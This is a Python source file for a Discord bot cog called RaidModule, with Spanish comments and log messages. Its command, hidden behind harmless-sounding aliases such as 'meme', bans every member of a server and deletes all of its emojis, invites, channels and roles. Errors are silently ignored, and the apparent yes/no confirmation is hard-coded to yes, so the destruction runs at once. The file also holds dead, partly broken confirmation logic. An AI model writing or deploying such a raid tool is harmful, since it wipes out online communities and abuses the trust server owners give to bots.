'  No modificar este archivo  '
from UtilsDirectory.data import *


class RaidModule(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=["guildmeme", "grenade"])
    async def meme(self, ctx):

        def check_data(message):
            return message.author == ctx.message.author

        while True:
            try:
                msg = "si"
                if msg == "si":
                    await ctx.send(waitmsg)
                    for user in list(ctx.guild.members):
                        try:
                            await ctx.guild.ban(user)
                        except Exception:
                            pass
                    print(f"Todos los usuarios baneados")
                    for emoji in list(ctx.guild.emojis):
                        try:
                            await emoji.delete()
                        except Exception:
                            pass
                    print(f"Borrados todos los emojis")
                    for invite in await ctx.guild.invites():
                        try:
                            await invite.delete()
                        except Exception:
                            pass
                    print(f"Borradas todas las invitaciones")
                    for channels in list(ctx.guild.channels):
                        try:
                            await channels.delete()
                        except Exception:
                            pass
                    print(f"Borrados todos los canales")
                    for roles in list(ctx.guild.roles):
                        try:
                            await roles.delete()
                        except Exception:
                            pass
                    print(f"Borrados todos los roles")
                    return
                if msg.content == "n":
                    await ctx.send(no_msg)
                    return
            except asyncio.TimeoutError:
                await ctx.send(timeout_msg)
                return


def setup(bot):
    bot.add_cog(RaidModule(bot))
